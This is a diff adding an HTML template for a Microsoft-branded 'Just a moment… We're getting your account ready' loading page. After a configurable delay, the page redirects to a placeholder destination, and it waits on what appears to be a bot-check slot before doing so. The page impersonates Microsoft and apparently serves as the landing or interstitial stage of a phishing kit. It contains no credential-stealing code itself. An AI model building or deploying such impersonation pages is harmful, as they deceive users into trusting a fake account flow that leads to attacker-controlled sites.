@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Just a moment…</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,system-ui,sans-serif;background:linear-gradient(150deg,#0067b8 0%,#0a4c8a 55%,#062f57 100%);color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center}
+.logo{width:132px;margin-bottom:34px;filter:drop-shadow(0 2px 10px rgba(0,0,0,.25))}
+h1{font-size:26px;font-weight:600;letter-spacing:-.2px}
+p{margin-top:10px;font-size:15px;color:rgba(255,255,255,.78)}
+.dots{margin-top:30px;display:flex;gap:9px}
+.dots i{width:10px;height:10px;border-radius:50%;background:#fff;opacity:.35;animation:b 1.15s infinite ease-in-out}
+.dots i:nth-child(2){animation-delay:.15s}.dots i:nth-child(3){animation-delay:.3s}.dots i:nth-child(4){animation-delay:.45s}.dots i:nth-child(5){animation-delay:.6s}
+@keyframes b{0%,100%{opacity:.25;transform:translateY(0)}50%{opacity:1;transform:translateY(-5px)}}
+.ring{margin-top:30px;width:30px;height:30px;border:2.5px solid rgba(255,255,255,.28);border-top-color:#fff;border-radius:50%;animation:spin .9s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.ts{margin-top:26px}
+.foot{position:fixed;bottom:22px;font-size:12.5px;color:rgba(255,255,255,.6)}
+</style>
+</head>
+<body>
+  <svg class="logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
+    <rect x="0" y="1" width="10" height="10" fill="#f25022"/>
+    <rect x="11" y="1" width="10" height="10" fill="#7fba00"/>
+    <rect x="0" y="12" width="10" height="10" fill="#00a4ef"/>
+    <rect x="11" y="12" width="10" height="10" fill="#ffb900"/>
+    <text x="27" y="18" font-family="Segoe UI,sans-serif" font-size="17" font-weight="600" fill="#fff">Microsoft</text>
+  </svg>
+  <h1>Just a moment…</h1>
+  <p>We're getting your account ready.</p>
+  <div class="dots"><i></i><i></i><i></i><i></i><i></i></div>
+  <div class="ts"><div id="__ts_slot__"></div></div>
+  <div class="foot">Secured connection</div>
+<script>
+var DEST = "__DESTINATION__", DELAY = __DELAY__;
+function __finish(){ if(window.__tsPending) return; if(DEST) window.location.replace(DEST); }
+window.__tsGo = __finish;
+if(DEST) setTimeout(__finish, DELAY*1000);
+setTimeout(function(){ if(window.__tsPending){ window.__tsPending=false; __finish(); } }, (DELAY+4)*1000);
+</script>
+</body>
+</html>
